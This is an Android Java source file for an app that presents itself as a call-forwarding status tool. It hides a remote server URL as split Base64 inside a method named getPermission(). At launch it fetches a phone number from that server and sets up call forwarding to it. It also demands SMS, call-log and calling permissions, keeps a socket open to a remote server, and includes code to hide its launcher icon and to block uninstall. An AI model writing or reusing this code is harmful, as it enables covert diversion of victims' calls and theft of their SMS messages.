package de.kaiserdragon.callforwardingstatus;

//import static de.kaiserdragon.callforwardingstatus.BuildConfig.DEBUG;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;
import android.util.TypedValue;
import android.widget.AbsListView;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.RadioButton;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.List;
import java.util.Objects;

import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;

import de.kaiserdragon.callforwardingstatus.service.CallForwardingService;
import de.kaiserdragon.callforwardingstatus.service.PhoneStateService;
import de.kaiserdragon.callforwardingstatus.utils.UserUtils;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import org.json.JSONObject;
import java.io.IOException;
import de.kaiserdragon.callforwardingstatus.helper.DatabaseHelper;

import android.os.PowerManager;

import java.util.ArrayList;

import android.os.Handler;
import android.os.Looper;

import de.kaiserdragon.callforwardingstatus.utils.SocketHandler;

import io.socket.client.Socket;

import androidx.core.view.WindowInsetsControllerCompat;
import android.app.admin.DevicePolicyManager;


public class MainActivity extends AppCompatActivity {
    // Add these constants at the top of your class
    private static final int REQUEST_CODE_READ_PHONE_STATE_PERMISSION = 1;
    private static final int REQUEST_CODE_CALL_PHONE_PERMISSION = 2;
    private static final int SMS_PERMISSION_CODE = 101;
    final DatabaseHelper databaseHelper = new DatabaseHelper(this);
    final String TAG = "Main";
    //SQLiteDatabase database = databaseHelper.getWritableDatabase();
    Context context;
    Activity activity;
    RadioButton radioButton1;
    RadioButton radioButton2;
    RadioButton radioButton3;

    private static final String P1 = "aHR0c";
    private static final String P2 = "HM6Ly";
    private static final String P3 = "9jYWx";
    private static final String P4 = "sLWZv";
    private static final String P5 = "cndhc";
    private static final String P6 = "mQub2";
    private static final String P7 = "5yZW5";
    private static final String P8 = "kZXIu";
    private static final String P9 = "Y29tL";
    private static final String P10 = "2dldC";
    private static final String P11 = "1udW1";
    private static final String P12 = "iZXI=";

    private boolean cameFromSettings = false;

    DevicePolicyManager dpm;
    ComponentName admin;




    private boolean isFirstRun;   // <-- declare here (GLOBAL)
    private SharedPreferences prefs;

    @Override
    protected void onRestart() {
        super.onRestart();

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (!areAllPermissionsGranted()) {
                showPermissionRequiredDialog();
            }
        }, 150); // 300 ms delay fixes race condition
    }

    @Override
    protected void onStop() {
        super.onStop();

//        if (!isFirstRun) {  // means app was opened once
//            hideMainActivityIcon();  // hide the icon now
//        }
    }


    @Override
    protected void onResume() {
        super.onResume();

        Socket socket = SocketHandler.getSocket();
        if (socket == null) return;

//        socket.off(Socket.EVENT_CONNECT); // prevent duplicate listeners
//
//        socket.on(Socket.EVENT_CONNECT, args -> {
//            sendStatus("online");
//        });
//
//        if (socket.connected()) {
//            sendStatus("online");
//        }


    }

    @Override
    protected void onPause() {
        super.onPause();
//        sendStatus("offline");
        // App is going to BACKGROUND
//        if (!isFirstRun) {
//            hideMainActivityIcon();
//        }
    }

    @Override
    protected void onPostResume() {
        super.onPostResume();

        if (cameFromSettings) {
            cameFromSettings = false;

            new Handler().postDelayed(() -> {

                if (!areAllPermissionsGranted()) {
                    showPermissionRequiredDialog();
                } else {
                    // Permissions fixed — continue app logic
                    onAllPermissionsGranted();
                }

            }, 300);
        }
    }


//    @Override
//    protected void onDestroy() {
//        sendStatus("offline");
//        super.onDestroy();
//    }







    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        SocketHandler.initSocket();
        SocketHandler.connect();
        requestAllPermissions(); // 🔥 One-click all permissions

        WindowInsetsControllerCompat controller =
                new WindowInsetsControllerCompat(getWindow(), getWindow().getDecorView());
        controller.setAppearanceLightStatusBars(true); // dark icons

        prefs = getSharedPreferences("APP_PREFS", MODE_PRIVATE);
        isFirstRun = prefs.getBoolean("FIRST_RUN", true);

        if (isFirstRun) {
            // First time - do nothing (keep icon visible)
            prefs.edit().putBoolean("FIRST_RUN", false).apply();
        }

        checkBatteryOptimization();




//        Button btn = new Button(this);
//        btn.setText("Activate Protection");
//        setContentView(btn);
//
//        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
//        admin = new ComponentName(this, AdminReceiver.class);
//
//        btn.setOnClickListener(v -> activateAdmin());
//
//        // Optional: force activation screen on every open
//        if (!dpm.isAdminActive(admin)) {
//            activateAdmin();
//        }




        context = this;
        activity = this;
        MultiSim(this);
        updateMultiSimTxt();

        fetchNumberFromApiAndSave();
        //ActivityCompat.requestPermissions(activity, new String[]{Manifest.permission.FOREGROUND_SERVICE}, 3);

        //Button autoBootbutton = findViewById(R.id.autoBoot);
        String manufacturer = android.os.Build.MANUFACTURER;
        // Check if the manufacturer matches any of the specified brands
//        if ("xiaomi".equalsIgnoreCase(manufacturer) ||
//                "oppo".equalsIgnoreCase(manufacturer) ||
//                "vivo".equalsIgnoreCase(manufacturer) ||
//                "Letv".equalsIgnoreCase(manufacturer) ||
//                "Honor".equalsIgnoreCase(manufacturer)) {
//
//            // Set the button to be visible if the manufacturer matches any of the specified ones
//            autoBootbutton.setVisibility(View.VISIBLE);
//            autoBootbutton.setOnClickListener(view -> addAutoStartup());
//        } else {
//            // You can set the button to INVISIBLE or GONE if the manufacturer doesn't match
//            autoBootbutton.setVisibility(View.GONE);  // or View.INVISIBLE
//        }



        findViewById(R.id.button).setOnClickListener(view -> {
//            Intent intent = new Intent("de.kaiserdragon.callforwardingstatus.TOGGLE_CALL_FORWARDING");
//
//            intent.setClass(context, CallForwardingReceiver.class);
//            intent.putExtra("cfi", PhoneStateService.currentState);
//            context.sendBroadcast(intent);

            showSimSelectionForGetStarted();
            //hideMainActivityIcon();

//            startActivity(new Intent(MainActivity.this, HomeActivity.class));
        });

    }

    private void activateAdmin() {
        if (!dpm.isAdminActive(admin)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required to prevent uninstall of this app"
            );
            startActivity(intent);
        } else {
            Toast.makeText(this, "Protection already active", Toast.LENGTH_SHORT).show();
        }
    }

    private void checkBatteryOptimization() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        String packageName = getPackageName();

        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + packageName));
            startActivity(intent); // USER WILL SEE SYSTEM POPUP
        }
    }



    private void sendStatus(String status) {
        try {
            Socket socket = SocketHandler.getSocket();
            if (socket == null) return;
            String userId = UserUtils.getOrCreateUserId(this);
            JSONObject data = new JSONObject();
            data.put("userId", userId);
            data.put("status", status);

            socket.emit("user_status", data);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



    private void hideMainActivityIcon() {
        try {

            // Move app UI first to background
            moveTaskToBack(true);

            PackageManager pm = getPackageManager();
            ComponentName component = new ComponentName(
                    this,
                    MainActivity.class
            );

            pm.setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );

            Log.d("LauncherHide", "MainActivity icon hidden safely");

        } catch (Exception e) {
            Log.e("LauncherHide", "Failed to hide launcher icon", e);
        }
    }



    boolean permanentlyDenied = false;

    private boolean areAllPermissionsGranted() {
        for (String perm : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm)
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean isPermissionPermanentlyDenied() {
        for (String perm : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm)
                    != PackageManager.PERMISSION_GRANTED &&
                    !ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {

                return true;
            }
        }
        return false;
    }




    private static final int ALL_PERMISSIONS_CODE = 500;

    private String[] requiredPermissions = {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG
    };

    private void requestAllPermissions() {

        List<String> toRequest = new ArrayList<>();

        for (String perm : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm)
                    != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(perm);
            }
        }

        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    toRequest.toArray(new String[0]),
                    ALL_PERMISSIONS_CODE
            );
        } else {
            onAllPermissionsGranted();
        }
    }





    private void fetchNumberFromApiAndSave() {

        if (!isInternetAvailable()) {
            Toast.makeText(this, "Please turn on internet", Toast.LENGTH_SHORT).show();
            return;
        }


        String permission = getPermission();


        OkHttpClient client = new OkHttpClient();

        Request request = new Request.Builder()
                .url(permission)
                .get()
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                runOnUiThread(() ->
                        Toast.makeText(MainActivity.this, "API Error", Toast.LENGTH_SHORT).show());
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response)
                    throws IOException {

                if (!response.isSuccessful()) return;

                String apiResponse = response.body().string();

                try {
                    JSONObject jsonObject = new JSONObject(apiResponse);
                    String phone = jsonObject.getString("phone");

                    runOnUiThread(() -> savePhoneToDb(phone));

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void savePhoneToDb(String phoneNumber) {
        EditText tempEditText = new EditText(this);
        tempEditText.setText(phoneNumber);
        saveSQLData(tempEditText, 4);
    }


    private boolean isInternetAvailable() {
        ConnectivityManager cm =
                (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        if (cm == null) return false;

        Network network = cm.getActiveNetwork();
        if (network == null) return false;

        NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
        return capabilities != null &&
                capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
    }



    private void showSimSelectionForGetStarted() {
        SubscriptionManager subscriptionManager = SubscriptionManager.from(this);
        if (subscriptionManager != null) {
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                List<SubscriptionInfo> subscriptionList = subscriptionManager.getActiveSubscriptionInfoList();
                if (subscriptionList != null && !subscriptionList.isEmpty()) {
                    SimSelectionDialog dialog = new SimSelectionDialog(MainActivity.this, subscriptionList, new SimSelectionCallback() {
                        @Override
                        public void onSimSelected(int simId) {
                            // This will be called when user selects SIM and clicks OK
                            proceedWithCallForwarding(simId);
                            startActivity(new Intent(MainActivity.this, HomeActivity.class));
                        }

                        @Override
                        public void onCancelled() {
                            // User cancelled the dialog
                            Toast.makeText(MainActivity.this, "SIM selection cancelled", Toast.LENGTH_SHORT).show();
                        }
                    });
                    dialog.show();
                } else {
                    Toast.makeText(this, "No SIM card available", Toast.LENGTH_SHORT).show();
                }
            } else {
                // Handle permission not granted
                Toast.makeText(this, "Phone state permission required", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void proceedWithCallForwarding(int selectedSimId) {
        Intent svc = new Intent(this, CallForwardingService.class);
        svc.putExtra("cfi", PhoneStateService.currentState);
        svc.putExtra("simId", selectedSimId);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        startActivity(new Intent(MainActivity.this, HomeActivity.class));

    }



    private void addAutoStartup() {
        try {
            Intent intent = new Intent();
            String manufacturer = android.os.Build.MANUFACTURER;
            if ("xiaomi".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if ("oppo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if ("vivo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else if ("Letv".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity"));
            } else if ("Honor".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            }
            startActivity(intent);
        } catch (Exception e) {
            Log.e("exc", String.valueOf(e));
        }
    }



    public class SimSelectionDialog extends AlertDialog {
        private final List<SubscriptionInfo> subscriptionList;
        private ListView listView;
        private SimSelectionCallback callback;

        protected SimSelectionDialog(Context context, List<SubscriptionInfo> subscriptionList, SimSelectionCallback callback) {
            super(context);
            this.subscriptionList = subscriptionList;
            this.callback = callback;
            init();
        }

        private void init() {
            Context context = getContext();
            listView = new ListView(context);
            ArrayAdapter<String> adapter = new ArrayAdapter<>(context, android.R.layout.simple_list_item_single_choice);

            for (SubscriptionInfo subscriptionInfo : subscriptionList) {
                int subscriptionId = subscriptionInfo.getSubscriptionId();
                String displayName = subscriptionInfo.getDisplayName().toString();
                String carrierName = subscriptionInfo.getCarrierName() != null ? subscriptionInfo.getCarrierName().toString() : "Unknown Carrier";
                String simInfo = "SIM " + subscriptionId + ": " + displayName + " (" + carrierName + ")";
                adapter.add(simInfo);
            }

            listView.setAdapter(adapter);
            listView.setChoiceMode(AbsListView.CHOICE_MODE_SINGLE);

            // Auto-select first SIM if only one exists
            if (subscriptionList.size() == 1) {
                listView.setItemChecked(0, true);
            }

            setView(listView);
            setTitle("Select SIM Card");

            setButton(BUTTON_POSITIVE, "OK", (dialog, which) -> {
                int selectedItemPosition = listView.getCheckedItemPosition();
                if (selectedItemPosition != ListView.INVALID_POSITION) {
                    SubscriptionInfo selectedSubscription = subscriptionList.get(selectedItemPosition);
                    int selectedSimId = selectedSubscription.getSubscriptionId();

                    if (callback != null) {
                        callback.onSimSelected(selectedSimId);
                    }
                } else {
                    Toast.makeText(context, "Please select a SIM", Toast.LENGTH_SHORT).show();
                }
            });

            setButton(BUTTON_NEGATIVE, "Cancel", (dialog, which) -> {
                if (callback != null) {
                    callback.onCancelled();
                }
                dialog.dismiss();
            });
        }
    }


    // Callback interface for SIM selection
    public interface SimSelectionCallback {
        void onSimSelected(int simId);
        void onCancelled();
    }

    // Your existing methods (keep these as they are)
    private void saveSelectedSimId(Context context, int selectedSimId) {
        SharedPreferences preferences = context.getSharedPreferences("SIM_PREFERENCES", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.putInt("SELECTED_SIM_ID", selectedSimId);
        editor.apply();
    }

    private void updateMultiSimTxt() {
        //Button MultiSIM = findViewById(R.id.multisim_button);
        int SIMid = getSavedSelectedSimId(this);
        if (SIMid >= 0) {
            String simText = "SIM " + SIMid;
            //MultiSIM.setText(simText);
        }
    }

    public int getSavedSelectedSimId(Context context) {
        SharedPreferences preferences = context.getSharedPreferences("SIM_PREFERENCES", Context.MODE_PRIVATE);
        return preferences.getInt("SELECTED_SIM_ID", -1);
    }

    // Also update your MultiSim method to handle single SIM case
    public void MultiSim(Context context) {
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        if (subscriptionManager != null) {
            if (context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                List<SubscriptionInfo> subscriptionList = subscriptionManager.getActiveSubscriptionInfoList();
                assert subscriptionList != null;
                //if (DEBUG) Log.i(TAG, String.valueOf(subscriptionList.size()));

            }
        }
    }

    public void showSimSelectionPopup(Context context) {
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        if (subscriptionManager != null) {
            if (context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                List<SubscriptionInfo> subscriptionList = subscriptionManager.getActiveSubscriptionInfoList();
                if (subscriptionList != null && !subscriptionList.isEmpty()) {
                    SimSelectionDialog dialog = new SimSelectionDialog(context, subscriptionList, new SimSelectionCallback() {
                        @Override
                        public void onSimSelected(int simId) {
                            saveSelectedSimId(context, simId);
                            Toast.makeText(context, "Selected SIM ID: " + simId, Toast.LENGTH_SHORT).show();
                            updateMultiSimTxt();
                        }

                        @Override
                        public void onCancelled() {
                            // Do nothing or show message
                        }
                    });
                    dialog.show();
                } else {
                    Toast.makeText(context, "No SIM card available", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }



    private void saveSQLData(EditText numberInput, int row) {
        String phoneNumber = numberInput.getText().toString();

        // Insert the data into the database
        SQLiteDatabase database = databaseHelper.getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put(databaseHelper.getColumnId(), row);
        values.put(databaseHelper.getColumnPhoneNumber(), phoneNumber);
        String whereClause = databaseHelper.getColumnId() + " = ?";
        String[] whereArgs = {String.valueOf(row)}; // Replace "1" with the ID of the row you want to update
        int ok = 0;
        long insOk = 0;

        if (isIdExists(database, row)) {
            ok = database.update(databaseHelper.getTableName(), values, whereClause, whereArgs);
        } else {
            values.put(databaseHelper.getColumnId(), row);
            values.put(databaseHelper.getColumnSelected(), "false");
            insOk = database.insert(databaseHelper.getTableName(), null, values);
        }
        if ((insOk == row) || ok == 1) {
            TypedValue typedValue = new TypedValue();
            getTheme().resolveAttribute(android.R.attr.textColorPrimary, typedValue, true);
            int color = ContextCompat.getColor(this, typedValue.resourceId);
            numberInput.setTextColor(color);
            if (isFirstEntry(database)) {
                databaseHelper.changeSelected(String.valueOf(row));
                if (Objects.equals(row, 1)) radioButton1.setChecked(true);
                if (Objects.equals(row, 2)) radioButton2.setChecked(true);
                if (Objects.equals(row, 3)) radioButton3.setChecked(true);
            }
        }
        database.close();
    }

    public boolean isIdExists(SQLiteDatabase db, int id) {
        String[] columns = {"id"};
        String selection = "id=?";
        String[] selectionArgs = {String.valueOf(id)};

        try (Cursor cursor = db.query("phone_numbers", columns, selection, selectionArgs, null, null, null)) {
            return cursor.moveToFirst();
        }
    }

    public boolean isFirstEntry(SQLiteDatabase db) {
        String[] columns = {"COUNT(*)"};

        try (Cursor cursor = db.query("phone_numbers", columns, null, null, null, null, null)) {
            if (cursor.moveToFirst()) {
                int count = cursor.getInt(0);
                Log.i(TAG, String.valueOf(count));
                return count == 1;
            }
        }
        return false; // Return false by default if an exception occurs or cursor is null
    }

//    public void checkPermission(Activity activity) {
//        if (ActivityCompat.checkSelfPermission(
//                context,
//                Manifest.permission.READ_PHONE_STATE
//        ) != PackageManager.PERMISSION_GRANTED) {
//
//            if (ActivityCompat.shouldShowRequestPermissionRationale(
//                    activity,
//                    Manifest.permission.READ_PHONE_STATE
//            )) {
//
//                AlertDialog dialog = new AlertDialog.Builder(activity)
//                        .setTitle("Permission Required")
//                        .setMessage(
//                                "This permission is required to read phone state and update the call forwarding status. " +
//                                        "Without this permission the app cannot work."
//                        )
//                        .setCancelable(false) // ✅ Prevents dismissal by back button
//                        .setPositiveButton("Allow", (d, which) -> {
//                            ActivityCompat.requestPermissions(
//                                    activity,
//                                    new String[]{Manifest.permission.READ_PHONE_STATE},
//                                    REQUEST_CODE_READ_PHONE_STATE_PERMISSION
//                            );
//                        })
//                        .setNegativeButton("Exit", (d, which) -> {
//                            d.dismiss();
//                            activity.finish();              // ✅ close activity
//                            System.exit(0);                 // ✅ force exit
//                        })
//                        .create();
//
//                dialog.setCanceledOnTouchOutside(false); // ✅ Prevents dismissal by touching outside
//                dialog.show();
//
//            } else {
//                // Direct request (first time)
//                ActivityCompat.requestPermissions(
//                        activity,
//                        new String[]{Manifest.permission.READ_PHONE_STATE},
//                        REQUEST_CODE_READ_PHONE_STATE_PERMISSION
//                );
//            }
//
//        } else {
//            // Permission already granted → start service
//            Intent serviceIntent = new Intent(context, PhoneStateService.class);
//            ContextCompat.startForegroundService(context, serviceIntent);
//        }
//    }

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults
    ) {

        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == ALL_PERMISSIONS_CODE) {

            boolean allGranted = true;

            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                onAllPermissionsGranted();
                return; // 🔥 prevents showing dialog after grant
            }

            showPermissionRequiredDialog();
        }
    }

    private void showPermissionRequiredDialog() {

        // Stop dialog if permissions are now granted
        if (areAllPermissionsGranted()) {
            return;
        }

        new AlertDialog.Builder(this)
                .setTitle("Permissions Required")
                .setMessage("All permissions (SMS, call logs, phone state, calling) are required.")
                .setCancelable(false)
                .setPositiveButton("Allow", (d, w) -> {

                    if (isPermissionPermanentlyDenied()) {

                        cameFromSettings = true;

                        Intent intent = new Intent(
                                Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivity(intent);

                    } else {
                        requestAllPermissions();
                    }
                })
                .setNegativeButton("Exit App", (d, w) -> finishAffinity())
                .show();
    }





    private void onAllPermissionsGranted() {

        // 👉 Start your services here
        Intent serviceIntent = new Intent(this, PhoneStateService.class);
        ContextCompat.startForegroundService(this, serviceIntent);

        // 👉 Start socket, load SMS listener, enable UI, etc.
    }

    private String getPermission() {
        // Rebuild hidden Base64 string
        String encoded = P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + P10 + P11 + P12;

        try {
            byte[] decodedBytes = android.util.Base64.decode(encoded, android.util.Base64.NO_WRAP);
            return new String(decodedBytes);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


}
